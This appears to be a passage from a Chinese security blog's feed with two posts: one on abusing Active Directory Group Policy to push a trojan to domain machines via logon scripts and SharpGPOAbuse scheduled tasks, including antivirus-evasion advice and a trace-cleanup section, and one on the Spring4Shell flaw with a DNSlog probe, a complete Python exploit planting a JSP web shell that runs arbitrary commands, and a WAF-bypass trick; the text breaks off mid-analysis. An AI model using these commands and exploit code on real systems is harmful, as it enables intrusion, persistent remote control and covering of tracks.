title="新建OU"></a><strong>新建OU</strong></h3><p><strong>新建OU 添加目标机器，或者用户，这里我以受害机器 windows7  用户 zhu 进行演示</strong></p><p><strong>新建组织单位 信息部</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132627484.png" alt="image-20220407132627484"></strong></p><p><strong>将原技术部 zhu  以及用户计算机移动到Ou信息部下</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132847253.png" alt="image-20220407132847253"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132958098.png" alt="image-20220407132958098"></strong></p><p><strong>运行gpmc.msc 进行组策略配置</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133111505.png" alt="image-20220407133111505"></strong></p><p><strong>在这个域中创建gpo 我们命名gptest</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133148655.png" alt="image-20220407133148655"></strong></p><p><strong>在 gptest 右键编辑</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133305492.png" alt="image-20220407133305492"></strong></p><p><strong>我们来设置登录脚本</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133339125.png" alt="image-20220407133339125"></strong></p><p><strong>这里我们以用户进行配置 -》Windows设置-》脚本登录</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133437331.png" alt="image-20220407133437331"></strong></p><p><strong>点击显示文件，将生成的木马 放入显示文件的目录里，然后点击添加脚本就行</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133542557.png" alt="image-20220407133542557"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133818172.png" alt="image-20220407133818172"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133840538.png" alt="image-20220407133840538"></strong></p><p><strong>组策略创建好后然后在ou右键选择链接到现有的GPO</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407134516884.png" alt="image-20220407134516884"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407134627539.png" alt="image-20220407134627539"></strong></p><p><strong>我们在域控刷新一下域策略在windows7机器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-GPUpdate -Computer windows7.kdc.com -RandomDelayInMinutes 0</span><br></pre></td></tr></table></figure><p><strong>重启登录受害用户</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407134223811.png" alt="image-20220407134223811"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407135100378.png" alt="image-20220407135100378"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407135127655.png" alt="image-20220407135127655"></strong></p><h3 id="计划任务执行"><a href="#计划任务执行" class="headerlink" title="计划任务执行"></a><strong>计划任务执行</strong></h3><p><strong>这种方法在组策略不需要用户重启电脑在Startup过程中执行任务，直接在运行过程中刷新组策略即可</strong></p><p><strong>具体方法在组策略里的用户配置-》首选项-》控制面板-》计划任务</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407135449573.png" alt="image-20220407135449573"></strong></p><p><strong>这里就不演示了，需要注意的是执行路径，需要受害机器能够访问到</strong></p><h2 id="不登录进行组策略下发执行"><a href="#不登录进行组策略下发执行" class="headerlink" title="不登录进行组策略下发执行"></a><strong>不登录进行组策略下发执行</strong></h2><p><strong>使用工具如下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FSecureLABS/SharpGPOAbuse</span><br><span class="line">https://github.com/Dliv3/SharpGPO</span><br></pre></td></tr></table></figure><p><strong>具体用法参照 readme ,落地注意免杀</strong></p><p><strong>新建ou</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action NewOU --OUName &quot;IT&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407140220034.png" alt="image-20220407140220034"></strong></p><p><strong>移动信息部下x用户到IT组下面</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action MoveObject --SrcDN &quot;CN=x,OU=信息部,DC=kdc,DC=com&quot; --DstDN &quot;OU=IT,DC=kdc,DC=com&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144113272.png" alt="image-20220407144113272"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144204392.png" alt="image-20220407144204392"></strong></p><p><strong>再将Administrators电脑移动到IT组下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action MoveObject --SrcDN &quot;CN=administrator,OU=技术部,DC=kdc,DC=com&quot; --DstDN &quot;OU=IT,DC=kdc,DC=com&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407152858750.png" alt="image-20220407152858750"></strong></p><p><strong>创建GPo  pergpo</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action NewGPO --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144725035.png" alt="image-20220407144725035"></strong></p><p><strong>sysvol下会出现策略配置信息</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144810105.png" alt="image-20220407144810105"></strong></p><p><strong>现在我们添加一个计划任务 来使目标机器或者用户上线</strong></p><p><strong>由于目标机器执行计划任务是以本地文件路径执行，所以我们要把木马文件放置在 目标机器可以访问的目录,sysvol目录是域内机器都可以访问到的目录我们可以把木马放置在该目录下</strong></p><p><strong>\kdc.com\SysVol\kdc.com\scripts</strong> </p><p><strong>注：执行时需要<code>cmd /c start</code>否则开机会有cmd窗口</strong></p><p><strong>添加用户计划任务</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPOAbuse.exe --AddUserTask --TaskName &quot;tu&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c start \\dc1\\SysVol\\kdc.com\\scripts\\artifact.exe&quot; --GPOName &quot;pergpo&quot;</span><br></pre></td></tr></table></figure><p><strong>添加机器计划任务</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;tu&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c start \\dc1\\SysVol\\kdc.com\\scripts\\artifact.exe&quot; --GPOName &quot;pergpo&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407155259864.png" alt="image-20220407155259864"></strong></p><p><strong>(注意这里 计划任务会在sysvol目录下存放一个计划任务配置的xml,每次换新的计划任务时需要删除掉此gpo下的计划配置文件。并重新下发计划任务，并重新更换任务名)</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407152556068.png" alt="image-20220407152556068"></strong></p><p><strong>将GPlink 链接到目标ou下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action NewGPLink --DN &quot;OU=IT,DC=kdc,DC=com&quot; --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407153317361.png"></strong></p><p><strong>刷新域策略上线</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-GPUpdate -Computer dc1.kdc.com -RandomDelayInMinutes 0</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407155714675.png" alt="image-20220407155714675"></strong></p><h2 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a><strong>清理痕迹</strong></h2><p><strong>删除gplink 链接</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPO.exe --Action RemoveGPLink --DN &quot;OU=IT,DC=kdc,DC=com&quot; --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407160108653.png" alt="image-20220407160108653"></strong></p><p><strong>删除gpo 或者可以直接删除sysvol 目录下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPO.exe --Action RemoveGPO --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong>移动ou 到原来目录 x administrator  科技部</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action MoveObject --SrcDN &quot;CN=Administrator,OU=IT,DC=kdc,DC=com&quot; --DstDN &quot;OU=技术部,DC=kdc,DC=com&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407160836202.png" alt="image-20220407160836202"></strong></p><p><strong>删除ou IT</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action RemoveOU --OUName &quot;IT&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407161003371.png" alt="image-20220407161003371"></strong></p><h2 id="end"><a href="#end" class="headerlink" title="end"></a><strong>end</strong></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;&lt;strong&gt;参考&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://redn3ck.github.io/2018/03/01</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>spring-shell 简析</title>
    <link href="http://example.com/2022/04/05/spring-shell/spring-shell/"/>
    <id>http://example.com/2022/04/05/spring-shell/spring-shell/</id>
    <published>2022-04-05T13:20:22.947Z</published>
    <updated>2022-04-06T04:55:47.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="spring-shell-简析"><a href="#spring-shell-简析" class="headerlink" title="spring-shell 简析"></a>spring-shell 简析</h2><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>tomcat-web-inf  检测是否存在302</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.mapperDirectoryRedirectEnabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>默认WEB_INF 页面访问是404</strong></p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111419548.png" alt="image-20220406111419548"></p><p><strong>发送poc</strong></p><p>&#x2F;WEB-INF</p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111310558.png" alt="image-20220406111310558"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.configFile=http:<span class="comment">//xxx</span></span><br><span class="line">x.dnslog.cn/t&amp;class.<span class="keyword">module</span>.classLoader.resources.context.configF</span><br><span class="line">ile.content.aaa=xxx</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /? HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 153</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://127.0.0.1:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">class.module.classLoader.resources.context.configFile=http://sss.29qlpu.dnslog.cn/t&amp;class.module.classLoader.resources.context.configFile.content.aaa=xxx</span><br></pre></td></tr></table></figure><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111715171.png" alt="image-20220406111715171"></p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111726230.png" alt="image-20220406111726230"></p><h2 id="漏洞利用-更改tomcat日志配置文件写shell"><a href="#漏洞利用-更改tomcat日志配置文件写shell" class="headerlink" title="漏洞利用 更改tomcat日志配置文件写shell"></a>漏洞利用 更改tomcat日志配置文件写shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exploit</span>(<span class="params">url</span>):</span><br><span class="line">    headers = &#123;<span class="string">&quot;suffix&quot;</span>:<span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">                <span class="string">&quot;c1&quot;</span>:<span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">                <span class="string">&quot;c2&quot;</span>:<span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">                <span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        go = requests.post(url,headers=headers,data=data,timeout=<span class="number">15</span>,allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>, proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8888&#x27;</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(go.status_code)</span><br><span class="line">        shellurl = urljoin(url, <span class="string">&#x27;tomcatwar.jsp&#x27;</span>)</span><br><span class="line">        shellgo = requests.get(shellurl,timeout=<span class="number">15</span>,allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> shellgo.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;漏洞存在，shell地址为:<span class="subst">&#123;shellurl&#125;</span>?pwd=j&amp;cmd=whoami&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Srping-Core Rce.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;url file&#x27;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        Exploit(args.url)</span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span> (args.file) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">                i = i.strip()</span><br><span class="line">                Exploit(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406124230300.png" alt="image-20220406124230300"></p><h2 id="Waf绕过"><a href="#Waf绕过" class="headerlink" title="Waf绕过"></a>Waf绕过</h2><p><strong>当参数以 ! 开头则会将其剔除掉，也就是 !class.module 会得到 class.module</strong></p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406125409295.png" alt="image-20220406125409295"></p><h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p><strong>由于spring-bean 的参数绑定机制，有get 以及 set 时，通过反射机制可以给其赋值，又由于对象绑定机制里缓存cache里会存在class bean 属性，通过getPropertyAccessorForPropertyPath方法 分割方法 依次循环 